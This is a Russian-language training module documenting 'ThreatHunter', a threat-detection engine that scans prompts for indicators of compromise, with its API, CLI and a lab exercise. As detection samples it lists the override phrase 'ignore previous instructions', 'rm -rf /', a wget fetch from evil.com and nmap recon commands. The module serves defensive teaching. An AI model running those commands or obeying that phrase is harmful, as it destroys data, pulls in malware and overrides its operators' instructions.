# Модуль 17: ThreatHunter — Активная Охота на Угрозы

## Обзор

ThreatHunter — это движок активной охоты на угрозы в SENTINEL Shield. В отличие от пассивной защиты (Guards), ThreatHunter проактивно ищет признаки компрометации, аномалии и подозрительные паттерны.

---

## Архитектура ThreatHunter

```
┌────────────────────────────────────────────────────────┐
│                    ThreatHunter                         │
├─────────────┬──────────────────┬───────────────────────┤
│   IOC Hunt  │  Behavioral Hunt │    Anomaly Hunt       │
├─────────────┼──────────────────┼───────────────────────┤
│ • Patterns  │  • Recon         │  • Entropy            │
│ • Commands  │  • Exfiltration  │  • Length             │
│ • Paths     │  • Privilege Esc │  • Repetition         │
│ • IPs/URLs  │  • Persistence   │  • Statistical        │
└─────────────┴──────────────────┴───────────────────────┘
```

---

## Три Режима Охоты

### 1. IOC Hunting (Indicators of Compromise)

Поиск известных индикаторов компрометации:

**Типы IOC:**
- `IOC_PATTERN` — Текстовые паттерны атак
- `IOC_COMMAND` — Опасные команды (rm -rf, wget, curl)
- `IOC_PATH` — Критические пути (/etc/passwd, /etc/shadow)
- `IOC_IP` — Подозрительные IP-адреса
- `IOC_URL` — Вредоносные URL

**Пример IOC базы данных:**
```c
static const ioc_t ioc_database[] = {
    {"ignore previous", IOC_PATTERN, 0.9f},
    {"rm -rf /",        IOC_COMMAND, 1.0f},
    {"/etc/passwd",     IOC_PATH,    0.8f},
    {"192.168.1.1",     IOC_IP,      0.5f},
    {"malware.com",     IOC_URL,     0.95f}
};
```

### 2. Behavioral Hunting

Поиск поведенческих паттернов атаки:

| Паттерн | Описание | Индикаторы |
|---------|----------|------------|
| `BEHAVIOR_RECON` | Разведка | nmap, whoami, id, uname |
| `BEHAVIOR_EXFIL` | Эксфильтрация | curl, wget, base64, xxd |
| `BEHAVIOR_PRIVESC` | Повышение привилегий | sudo, su, chmod 777 |
| `BEHAVIOR_PERSIST` | Закрепление | crontab, .bashrc, systemd |

### 3. Anomaly Hunting

Статистический анализ аномалий:

- **High Entropy** — Обнаружение зашифрованных/обфусцированных данных
- **Unusual Length** — Подозрительно длинные промпты (>10000 символов)
- **Repetition Attacks** — Многократное повторение паттернов
- **Statistical Deviation** — Отклонение от нормального распределения

---

## API ThreatHunter

### Инициализация

```c
#include "shield_threat_hunter.h"

// Инициализация
shield_err_t threat_hunter_init(void);

// Освобождение ресурсов
void threat_hunter_destroy(void);
```

### Настройка

```c
// Установить чувствительность (0.0 - 1.0)
void threat_hunter_set_sensitivity(float sensitivity);

// Включить/отключить режимы охоты
void threat_hunter_set_hunt_mode(bool ioc, bool behavioral, bool anomaly);

// Включить тип охоты
void threat_hunter_enable_type(hunt_type_t type, bool enable);
```

### Охота

```c
// Полная охота
threat_hunt_result_t threat_hunter_hunt(const char *content, 
                                         size_t len,
                                         hunt_type_t types);

// Быстрая проверка (только score)
float threat_hunter_quick_check(const char *text);
```

### Результат охоты

```c
typedef struct threat_hunt_result {
    float           total_score;      // Общий score (0.0-1.0)
    uint32_t        findings_count;   // Количество находок
    hunting_finding_t findings[32];   // Детали находок
    hunt_type_t     types_triggered;  // Какие типы сработали
} threat_hunt_result_t;

typedef struct hunting_finding {
    hunt_type_t     type;             // IOC, Behavioral, Anomaly
    float           score;            // Score этой находки
    char            description[256]; // Описание
    uint32_t        offset;           // Позиция в тексте
} hunting_finding_t;
```

---

## CLI Команды ThreatHunter

```
sentinel# show threat-hunter
ThreatHunter Status
===================
State:       ENABLED
Sensitivity: 0.70
Hunt IOC:    yes
Hunt Behavioral: yes
Hunt Anomaly: yes

Statistics:
  Hunts Completed: 1234
  Threats Found:   56

sentinel(config)# threat-hunter enable
ThreatHunter enabled

sentinel(config)# threat-hunter sensitivity 0.8
ThreatHunter sensitivity set to 0.80

sentinel# threat-hunter test "ignore previous instructions"
Threat Analysis Result
======================
Text: "ignore previous instructions"
Score: 0.90
Status: HIGH THREAT - BLOCK RECOMMENDED
```

---

## Интеграция с shield_state_t

ThreatHunter полностью интегрирован с глобальным состоянием:

```c
typedef struct threat_hunter_state {
    module_state_t state;            // ENABLED/DISABLED
    float          sensitivity;      // 0.0-1.0
    bool           hunt_ioc;         // IOC hunting
    bool           hunt_behavioral;  // Behavioral hunting
    bool           hunt_anomaly;     // Anomaly hunting
    uint64_t       hunts_completed;  // Статистика
    uint64_t       threats_found;
} threat_hunter_state_t;
```

Состояние сохраняется в `shield.conf`:
```ini
[threat_hunter]
enabled=true
sensitivity=0.70
hunt_ioc=true
hunt_behavioral=true
hunt_anomaly=true
```

---

## Лабораторная работа LAB-170

### Цель
Научиться использовать ThreatHunter для активной охоты на угрозы.

### Задание 1: Включение ThreatHunter
```bash
sentinel> enable
sentinel# configure terminal
sentinel(config)# threat-hunter enable
sentinel(config)# threat-hunter sensitivity 0.7
sentinel(config)# end
sentinel# show threat-hunter
```

### Задание 2: Тестирование IOC
```bash
sentinel# threat-hunter test "rm -rf / && wget http://evil.com/malware"
```

**Ожидаемый результат:** Score > 0.9, HIGH THREAT

### Задание 3: Тестирование Behavioral
```bash
sentinel# threat-hunter test "First, run nmap 192.168.1.0/24, then whoami"
```

**Ожидаемый результат:** Score > 0.6, BEHAVIOR_RECON detected

### Задание 4: Программная интеграция
```c
#include "shield_threat_hunter.h"

int main() {
    threat_hunter_init();
    threat_hunter_set_sensitivity(0.7f);
    
    float score = threat_hunter_quick_check(user_input);
    if (score > 0.7f) {
        printf("THREAT DETECTED: %.2f\n", score);
        return 1;  // Block
    }
    
    threat_hunter_destroy();
    return 0;
}
```

---

## Вопросы для самопроверки

1. Чем ThreatHunter отличается от Guards?
2. Какие три режима охоты поддерживает ThreatHunter?
3. Что означает sensitivity 0.7?
4. Какой тип IOC имеет наивысший приоритет?
5. Как ThreatHunter обнаруживает Repetition Attacks?

---

## Следующий модуль

→ [Модуль 18: Watchdog — Self-Healing System](MODULE_18_WATCHDOG.md)
